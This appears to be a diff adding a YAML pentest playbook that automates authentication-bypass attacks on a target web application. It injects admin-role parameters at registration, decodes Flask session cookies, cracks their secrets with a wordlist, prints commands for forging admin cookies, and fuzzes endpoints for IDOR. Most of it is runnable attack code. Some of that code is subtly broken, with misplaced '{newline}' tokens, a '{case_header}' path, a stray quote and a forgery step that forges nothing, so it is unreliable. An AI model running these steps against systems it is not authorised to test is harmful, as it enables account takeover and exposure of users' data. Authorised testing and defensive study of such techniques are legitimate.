@@ -1,0 +1,367 @@
+name: "Web Application Authentication Bypass Assessment"
+description: >
+  Comprehensive assessment of web application authentication mechanisms.
+  Covers registration parameter injection, session forgery (Flask, Django, JWT),
+  role/privilege escalation, weak secret cracking, IDOR, and admin endpoint discovery.
+  Based on real OSCP and bug bounty findings.
+version: "2.0"
+target_required: true
+vars:
+  web_port: "80"
+  register_endpoint: "/register"
+  login_endpoint: "/login"
+  admin_endpoint: "/admin"
+vars_description:
+  web_port: "Port of the web application"
+  register_endpoint: "User registration endpoint path"
+  login_endpoint: "Login endpoint path"
+  admin_endpoint: "Admin panel endpoint path"
+preflight:
+  name: preflight_check
+  description: "Verify target connectivity and tool availability"
+  steps:
+    - name: connectivity
+      description: "Check target and tool availability"
+      command: >
+        echo "=== Connectivity ===";
+        ping -c 1 -W 3 "{target}" 2>&1 | head -2;
+        curl -sk --max-time 5 "http://{target}:{web_port}/" -o /dev/null -w "HTTP %{http_code}\\n";
+        echo "=== Tools ===";
+        which curl python3 jq whatweb nuclei flask-unsign 2>&1;
+        python3 -c "import json,hashlib,itertools,sys; print('Python tools OK')" 2>&1
+steps:
+  - name: preamble
+    description: "Create output directories"
+    command: >
+      mkdir -p "{case_dir}/recon" "{case_dir}/auth" "{case_dir}/session"
+      "{case_dir}/exploit" "{case_dir}/report"{newline}
+      echo "Directories ready" > "{case_dir}/preamble.txt"
+  - name: web_fingerprint
+    description: "Fingerprint web application and identify tech stack"
+    command: >
+      echo "=== Web application fingerprint ===" > "{case_dir}/recon/web_fingerprint.txt{newline}"
+      echo "--- HTTP Headers ---" >> "{case_dir}/recon/web_fingerprint.txt";
+      curl -skI "http://{target}:{web_port}/" 2>&1 >> "{case_dir}/recon/web_fingerprint.txt";
+      echo "" >> "{case_dir}/recon/web_fingerprint.txt";
+      echo "--- WhatWeb ---" >> "{case_dir}/recon/web_fingerprint.txt";
+      whatweb "http://{target}:{web_port}" 2>&1 >> "{case_dir}/recon/web_fingerprint.txt";
+      echo "" >> "{case_dir}/recon/web_fingerprint.txt";
+      echo "--- Technology hints from HTML ---" >> "{case_dir}/recon/web_fingerprint.txt";
+      curl -sk "http://{target}:{web_port}/" 2>/dev/null | grep -oiE "(flask|django|rails|laravel|express|next\.js|react|angular|vue|wordpress|drupal|joomla|asp\.net|php|tomcat|jetty|nginx|apache)" | sort -u >> "{case_dir}/recon/web_fingerprint.txt";
+      echo "" >> "{case_dir}/recon/web_fingerprint.txt";
+      echo "--- Cookies ---" >> "{case_dir}/recon/web_fingerprint.txt";
+      curl -skv "http://{target}:{web_port}/" 2>&1 | grep -i "^< set-cookie" >> "{case_dir}/recon/web_fingerprint.txt"
+  - name: endpoint_discovery
+    description: "Discover endpoints via crawling and wordlists"
+    command: >
+      echo "=== Endpoint discovery ===" > "{case_dir}/recon/endpoints.txt{newline}"
+      echo "--- Gobuster common paths ---" >> "{case_dir}/recon/endpoints.txt";
+      gobuster dir -u "http://{target}:{web_port}" -w /usr/share/wordlists/dirb/common.txt -t 30 -x php,html,txt,xml,json -o "{case_dir}/recon/gobuster_common.txt" 2>&1 | tail -5;
+      [ -f "{case_dir}/recon/gobuster_common.txt" ] && cat "{case_dir}/recon/gobuster_common.txt" >> "{case_dir}/recon/endpoints.txt";
+      echo "" >> "{case_dir}/recon/endpoints.txt";
+      echo "--- Important paths to check ---" >> "{case_dir}/recon/endpoints.txt";
+      for ep in "{login_endpoint}" "{register_endpoint}" "{admin_endpoint}" \
+                 "/login" "/register" "/signup" "/signin" "/admin" "/dashboard" \
+                 "/api" "/api/users" "/api/admin" "/api/register" "/reset" \
+                 "/forgot" "/forgot-password" "/reset-password" "/change-password" \
+                 "/profile" "/settings" "/account" "/admin/users" "/api/v1" \
+                 "/api/v2" "/graphql" "/swagger" "/api-docs" "/docs"; do
+        HTTP=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}" "http://{target}:{web_port}$ep" 2>/dev/null);
+        if [ "$HTTP" != "000" ] && [ "$HTTP" != "404" ]; then
+          echo "  $ep -> HTTP $HTTP" >> "{case_dir}/recon/endpoints.txt";
+        fi;
+      done
+  - name: registration_analysis
+    description: "Analyze registration endpoint for parameter injection"
+    command: >
+      echo "=== Registration analysis ===" > "{case_dir}/auth/registration.txt{newline}"
+      # First check registration without injection
+      echo "--- Normal registration ---" >> "{case_dir}/auth/registration.txt";
+      curl -sk --max-time 10 -v "http://{target}:{web_port}{register_endpoint}" \
+        -d "fullName=TestUser&company=TestCo&username=testuser_$(date +%s)&password=Password1" \
+        -o /dev/null -w "HTTP %{http_code}\\n" 2>&1 >> "{case_dir}/auth/registration.txt";
+      echo "" >> "{case_dir}/auth/registration.txt";
+      echo "--- Parameter injection testing ---" >> "{case_dir}/auth/registration.txt";
+      for param in "role=admin" "is_admin=1" "admin=true" "admin=1" "user_type=admin" \
+                   "permissions=admin" "group=admin" "level=admin" "access=full" \
+                   "privilege=admin" "account_type=admin" "user_role=admin" \
+                   "is_staff=true" "is_superuser=true" "is_admin=true" \
+                   "admin=true" "verified=true" "active=true" "status=active"; do
+        UNIQUE="inject_$(date +%s)_$RANDOM";
+        RESULT=$(curl -sk --max-time 10 "http://{target}:{web_port}{register_endpoint}" \
+          -d "fullName=TestUser&company=TestCo&username=$UNIQUE&password=Password1&$param" \
+          -o /tmp/reg_result.txt -w "%{http_code}" 2>/dev/null);
+        BODY=$(cat /tmp/reg_result.txt 2>/dev/null);
+        echo "  Testing: $param -> HTTP $RESULT" >> "{case_dir}/auth/registration.txt";
+        # Try login with the injected account
+        LOGIN=$(curl -sk --max-time 10 -c /tmp/cookies_$UNIQUE.txt \
+          "http://{target}:{web_port}{login_endpoint}" \
+          -d "username=$UNIQUE&password=Password1" \
+          -o /dev/null -w "%{http_code}" 2>/dev/null);
+        if [ "$LOGIN" = "302" ] || [ "$LOGIN" = "200" ]; then
+          echo "    Login: HTTP $LOGIN (logged in)" >> "{case_dir}/auth/registration.txt";
+          # Check admin access
+          for admin_ep in "{admin_endpoint}" "/admin" "/dashboard" "/api/admin"; do
+            ADMIN=$(curl -sk --max-time 5 -b /tmp/cookies_$UNIQUE.txt \
+              "http://{target}:{web_port}$admin_ep" \
+              -o /dev/null -w "%{http_code}" 2>/dev/null);
+            echo "    Admin check $admin_ep: HTTP $ADMIN" >> "{case_dir}/auth/registration.txt";
+            if [ "$ADMIN" != "403" ] && [ "$ADMIN" != "302" ] && [ "$ADMIN" != "401" ]; then
+              echo "    *** POSSIBLE ADMIN ACCESS with $param ***" >> "{case_dir}/auth/registration.txt";
+            fi;
+          done;
+        fi;
+        rm -f /tmp/cookies_$UNIQUE.txt 2>/dev/null;
+      done;
+      rm -f /tmp/reg_result.txt 2>/dev/null
+  - name: session_cookie_analysis
+    description: "Decode and analyze session cookies"
+    command: >
+      echo "=== Session cookie analysis ===" > "{case_dir}/session/session_analysis.txt{newline}"
+      # Register a test user and get session
+      UNIQUE="sess_$(date +%s)_$RANDOM";
+      curl -sk --max-time 10 -c "{case_dir}/session/cookies.txt" \
+        "http://{target}:{web_port}{register_endpoint}" \
+        -d "fullName=TestUser&company=TestCo&username=$UNIQUE&password=Password1" \
+        -o /dev/null 2>/dev/null;
+      curl -sk --max-time 10 -c "{case_dir}/session/cookies.txt" -b "{case_dir}/session/cookies.txt" \
+        "http://{target}:{web_port}{login_endpoint}" \
+        -d "username=$UNIQUE&password=Password1" \
+        -o /dev/null 2>/dev/null;
+      echo "--- Raw cookies ---" >> "{case_dir}/session/session_analysis.txt";
+      cat "{case_dir}/session/cookies.txt" >> "{case_dir}/session/session_analysis.txt";
+      echo "" >> "{case_dir}/session/session_analysis.txt";
+      echo "--- Session cookie detection ---" >> "{case_dir}/session/session_analysis.txt";
+      python3 -c "
+import re, sys
+cookies = open('{case_dir}/session/cookies.txt').read()
+# Flask session (base64+timestamp+signature)
+flask_cookies = re.findall(r'[a-zA-Z0-9+/.=]+\.(?:r?[A-Za-z0-9_-]){6,}', cookies)
+for fc in flask_cookies:
+    if len(fc) > 20:
+        print(f'Possible Flask cookie: {fc[:80]}...')
+# JWT
+jwt_cookies = re.findall(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', cookies)
+for jc in jwt_cookies:
+    print(f'JWT cookie: {jc[:80]}...')
+# Django session
+django_cookies = re.findall(r'[a-z0-9]{32}', cookies)
+for dc in django_cookies:
+    print(f'Possible Django/random session: {dc}')
+# Generic token patterns
+tokens = re.findall(r'(?:session|token|auth|sid)=([^;\\s]+)', cookies, re.IGNORECASE)
+for t in tokens:
+    print(f'Session value: {t[:80]}')
+" >> "{case_dir}/session/session_analysis.txt"
+  - name: flask_session_decode
+    description: "Decode Flask session cookies and extract payload"
+    command: >
+      echo "=== Flask session decode ===" > "{case_dir}/session/flask_decode.txt{newline}"
+      python3 -c "
+import re, sys, base64, json, zlib
+
+cookies = open('{case_dir}/session/cookies.txt').read()
+flask_cookies = re.findall(r'([a-zA-Z0-9+/.=]+)\.(?:[A-Za-z0-9_-]){6,}', cookies)
+
+for raw in flask_cookies:
+    if len(raw) < 10: continue
+    try:
+        # Flask session is: base64(data).timestamp.signature
+        # Data might be compressed
+        padding = 4 - len(raw) % 4
+        if padding != 4: raw += '=' * padding
+        decoded = base64.urlsafe_b64decode(raw)
+        # Try decompress
+        try:
+            decoded = zlib.decompress(decoded)
+        except: pass
+        payload = json.loads(decoded)
+        print(f'Decoded session: {json.dumps(payload, indent=2)}')
+        # Check for interesting fields
+        for key in ['admin','is_admin','role','is_superuser','is_staff',
+                    'user_type','permissions','group','level','access']:
+            val = payload.get(key, payload.get(key.lower(), payload.get(key.upper())))
+            if val is not None:
+                print(f'  [{key}] = {val}')
+                if isinstance(val, bool) and not val:
+                    print(f'  *** Try forging: \"{key}\": true ***')
+                elif isinstance(val, (int, float)) and val == 0:
+                    print(f'  *** Try forging: \"{key}\": 1 ***')
+    except Exception as e:
+        print(f'Decode failed for {raw[:40]}...: {e}')
+" >> "{case_dir}/session/flask_decode.txt"
+  - name: flask_secret_crack
+    description: "Crack Flask session secret key using common wordlists"
+    command: >
+      echo "=== Flask secret cracking ===" > "{case_dir}/session/flask_crack.txt{newline}"
+      python3 -c "
+import re, sys
+cookies = open('{case_dir}/session/cookies.txt').read()
+flask_full = re.findall(r'([a-zA-Z0-9+/.=]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+)', cookies)
+for fc in flask_full:
+    if len(fc) > 40:
+        print(f'Cookie to crack: {fc[:100]}')
+        print()
+        break
+" >> "{case_dir}/session/flask_crack.txt";
+      echo "" >> "{case_dir}/session/flask_crack.txt";
+      echo "Using flask-unsign (if available):" >> "{case_dir}/session/flask_crack.txt";
+      COOKIE=$(python3 -c "
+import re; cookies = open('{case_dir}/session/cookies.txt').read()
+fc = re.findall(r'([a-zA-Z0-9+/.=]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+)', cookies)
+for f in fc:
+    if len(f) > 40: print(f[:120]); break
+" 2>/dev/null);
+      if [ -n "$COOKIE" ]; then
+        echo "Cookie: $COOKIE" >> "{case_dir}/session/flask_crack.txt";
+        which flask-unsign 2>/dev/null && {
+          echo "--- Wordlist crack ---" >> "{case_dir}/session/flask_crack.txt";
+          flask-unsign --no-literal-eval --unsign --cookie "$COOKIE" \
+            --wordlist /usr/share/wordlists/rockyou.txt 2>&1 | tail -10 >> "{case_dir}/session/flask_crack.txt";
+        } || {
+          echo "flask-unsign not found. Try:" >> "{case_dir}/session/flask_crack.txt";
+          echo "  pip install flask-unsign" >> "{case_dir}/session/flask_crack.txt";
+          echo "  flask-unsign --unsign --cookie \"$COOKIE\" --wordlist <wordlist>" >> "{case_dir}/session/flask_crack.txt";
+        };
+      fi
+  - name: session_forgery
+    description: "Forge admin session cookie using cracked secret or known patterns"
+    command: >
+      echo "=== Session forgery ===" > "{case_dir}/session/session_forgery.txt{newline}"
+      # Extract session payload structure from earlier decode
+      python3 -c "
+import json, sys
+try:
+    # Try to decode the session to get payload structure
+    import re, base64, zlib
+    cookies = open('{case_dir}/session/cookies.txt').read()
+    fc = re.findall(r'([a-zA-Z0-9+/.=]+)\\.(?:[A-Za-z0-9_-]){6,}', cookies)
+    for raw in fc:
+        if len(raw) < 10: continue
+        padding = 4 - len(raw) % 4
+        if padding != 4: raw += '=' * padding
+        decoded = base64.urlsafe_b64decode(raw)
+        try: decoded = zlib.decompress(decoded)
+        except: pass
+        payload = json.loads(decoded)
+        print(f'Original payload: {json.dumps(payload, indent=2)}')
+        print()
+        # Generate forged payloads
+        for admin_field in ['is_admin', 'admin', 'role', 'is_superuser', 'is_staff']:
+            forged = dict(payload)
+            forged[admin_field] = True if isinstance(payload.get(admin_field), bool) else 1
+            print(f'Forged ({\"is_admin\":True}): pending secret key')
+            break
+        break
+except Exception as e:
+    print(f'Error: {e}')
+" >> "{case_dir}/session/session_forgery.txt";
+      echo "" >> "{case_dir}/session/session_forgery.txt";
+      echo "Manual flask-unsign sign:" >> "{case_dir}/session/session_forgery.txt";
+      echo "  flask-unsign --sign --cookie \"{...payload...}\" --secret \"SECRET_KEY\"" >> "{case_dir}/session/session_forgery.txt";
+      echo "" >> "{case_dir}/session/session_forgery.txt";
+      echo "Use the forged cookie:" >> "{case_dir}/session/session_forgery.txt";
+      echo "  curl -b 'session=<forged_cookie>' http://{target}:{web_port}/admin" >> "{case_dir}/session/session_forgery.txt"
+  - name: admin_endpoint_test
+    description: "Test discovered admin endpoints with forged/privileged session"
+    command: >
+      echo "=== Admin endpoint testing ===" > "{case_dir}/exploit/admin_test.txt{newline}"
+      echo "--- Enumerating admin endpoints ---" >> "{case_dir}/exploit/admin_test.txt";
+      for ep in $(grep -E "(admin|dashboard|manage|panel|console|api/v)" "{case_dir}/recon/endpoints.txt" 2>/dev/null | awk '{print $1}'); do
+        echo "Endpoint: $ep" >> "{case_dir}/exploit/admin_test.txt";
+        # Test without auth
+        NOAUTH=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}" "http://{target}:{web_port}$ep" 2>/dev/null);
+        echo "  No auth: HTTP $NOAUTH" >> "{case_dir}/exploit/admin_test.txt";
+        # Test with admin session cookies if we have any
+        if [ -f "{case_dir}/auth/registration.txt" ]; then
+          # Find injected admin cookies from earlier step
+          for cf in /tmp/cookies_*.txt 2>/dev/null; do
+            [ -f "$cf" ] || continue;
+            AUTH=$(curl -sk --max-time 5 -b "$cf" "http://{target}:{web_port}$ep" -o /dev/null -w "%{http_code}" 2>/dev/null);
+            echo "  With injected cookie: HTTP $AUTH" >> "{case_dir}/exploit/admin_test.txt";
+          done;
+        fi;
+      done
+  - name: parameter_fuzzing
+    description: "Fuzz endpoints for IDOR and hidden parameters"
+    command: >
+      echo "=== Parameter and IDOR testing ===" > "{case_dir}/exploit/parameter_fuzzing.txt{newline}"
+      echo "--- Test common parameters on sensitive endpoints ---" >> "{case_dir}/exploit/parameter_fuzzing.txt";
+      for ep in "/api/users" "/api/admin" "/api/items" "/api/data" "/api/metrics" \
+                 "/users" "/items" "/documents" "/files" "/orders"; do
+        HTTP=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}" "http://{target}:{web_port}$ep" 2>/dev/null);
+        if [ "$HTTP" != "000" ] && [ "$HTTP" != "404" ]; then
+          echo "Endpoint: $ep (HTTP $HTTP)" >> "{case_dir}/exploit/parameter_fuzzing.txt";
+          for param in "?id=1" "?user_id=1" "?customer_id=1" "?admin=true" \
+                       "?limit=100" "?offset=0" "?page=1" "?order=ASC" \
+                       "?format=json" "?debug=true" "?test=true"; do
+            RESULT=$(curl -sk --max-time 5 "http://{target}:{web_port}$ep$param" -o /tmp/idor_test.txt -w "%{http_code}" 2>/dev/null);
+            BODY=$(cat /tmp/idor_test.txt 2>/dev/null);
+            if echo "$BODY" | grep -qiE "(admin|user|email|password|secret|ssn|credit|phone)" 2>/dev/null; then
+              echo "  $param -> HTTP $RESULT (contains sensitive data)" >> "{case_dir}/exploit/parameter_fuzzing.txt";
+              echo "  Preview: $(echo $BODY | head -c 200)" >> "{case_dir}/exploit/parameter_fuzzing.txt";
+            fi;
+          done;
+        fi;
+      done;
+      rm -f /tmp/idor_test.txt 2>/dev/null
+  - name: rate_limit_test
+    description: "Test authentication rate limiting"
+    command: >
+      echo "=== Rate limit testing ===" > "{case_dir}/auth/rate_limit.txt{newline}"
+      echo "Testing {login_endpoint} with rapid requests..." >> "{case_dir}/auth/rate_limit.txt";
+      for i in $(seq 1 20); do
+        HTTP=$(curl -sk --max-time 3 -o /dev/null -w "%{http_code}" \
+          "http://{target}:{web_port}{login_endpoint}" \
+          -d "username=admin\$i&password=wrong" 2>/dev/null);
+        echo "  Request $i: HTTP $HTTP" >> "{case_header}/auth/rate_limit.txt";
+      done;
+      echo "" >> "{case_dir}/auth/rate_limit.txt";
+      echo "Check for rate limiting headers:" >> "{case_dir}/auth/rate_limit.txt";
+      curl -skv "http://{target}:{web_port}{login_endpoint}" \
+        -d "username=admin&password=wrong" 2>&1 | grep -iE "(rate|retry|429|limit|throttle)" >> "{case_dir}/auth/rate_limit.txt"
+  - name: compile_report
+    description: "Compile comprehensive vulnerability report"
+    command: >
+      echo "# Web Application Authentication Bypass Report" > "{case_dir}/report/auth_bypass_report.md{newline}"
+      echo "Target: {target}:{web_port}" >> "{case_dir}/report/auth_bypass_report.md";
+      echo "Date: $(date -u)" >> "{case_dir}/report/auth_bypass_report.md";
+      echo "" >> "{case_dir}/report/auth_bypass_report.md";
+      echo "## Technology" >> "{case_dir}/report/auth_bypass_report.md";
+      cat "{case_dir}/recon/web_fingerprint.txt" 2>/dev/null | grep -iE "(flask|django|jwt|session|cookie|powered)" | head -10 >> "{case_dir}/report/auth_bypass_report.md";
+      echo "" >> "{case_dir}/report/auth_bypass_report.md";
+      echo "## Registration Bypass" >> "{case_dir}/report/auth_bypass_report.md";
+      if grep -q "POSSIBLE ADMIN ACCESS" "{case_dir}/auth/registration.txt" 2>/dev/null; then
+        echo "- **Parameter injection confirmed**" >> "{case_dir}/report/auth_bypass_report.md";
+        grep "POSSIBLE ADMIN ACCESS" "{case_dir}/auth/registration.txt" >> "{case_dir}/report/auth_bypass_report.md";
+      fi;
+      echo "" >> "{case_dir}/report/auth_bypass_report.md";
+      echo "## Session Security" >> "{case_dir}/report/auth_bypass_report.md";
+      if grep -q "is_admin" "{case_dir}/session/flask_decode.txt" 2>/dev/null; then
+        echo "- Session contains `is_admin` field (forgeable)" >> "{case_dir}/report/auth_bypass_report.md";
+      fi;
+      if grep -q "Secret:" "{case_dir}/session/flask_crack.txt" 2>/dev/null; then
+        echo "- **Session secret cracked**" >> "{case_dir}/report/auth_bypass_report.md";
+      fi;
+      echo "" >> "{case_dir}/report/auth_bypass_report.md";
+      echo "## IDOR & Parameter Injection" >> "{case_dir}/report/auth_bypass_report.md";
+      if grep -q "sensitive data" "{case_dir}/exploit/parameter_fuzzing.txt" 2>/dev/null; then
+        echo "- **Sensitive data exposure via parameter manipulation**" >> "{case_dir}/report/auth_bypass_report.md";
+      fi;
+      echo "" >> "{case_dir}/report/auth_bypass_report.md";
+      echo "## Rate Limiting" >> "{case_dir}/report/auth_bypass_report.md";
+      if grep -q "429" "{case_dir}/auth/rate_limit.txt" 2>/dev/null; then
+        echo "- Rate limiting present (HTTP 429 after N requests)" >> "{case_dir}/report/auth_bypass_report.md";
+      else
+        echo "- **No rate limiting detected** (20 requests all returned same status)" >> "{case_dir}/report/auth_bypass_report.md";
+      fi;
+      echo "" >> "{case_dir}/report/auth_bypass_report.md";
+      echo "## Admin Endpoints" >> "{case_dir}/report/auth_bypass_report.md";
+      cat "{case_dir}/recon/endpoints.txt" 2>/dev/null | grep -v "^---" >> "{case_dir}/report/auth_bypass_report.md"
+postflight:
+  - name: cleanup
+    description: "Clean up temporary cookies"
+    command: >
+      rm -f /tmp/cookies_*.txt /tmp/reg_result.txt /tmp/idor_test.txt 2>/dev/null"{newline}"
+      rm -f "{case_dir}/session/cookies.txt" 2>/dev/null;
+      echo "Cleanup done" > "{case_dir}/cleanup.txt"
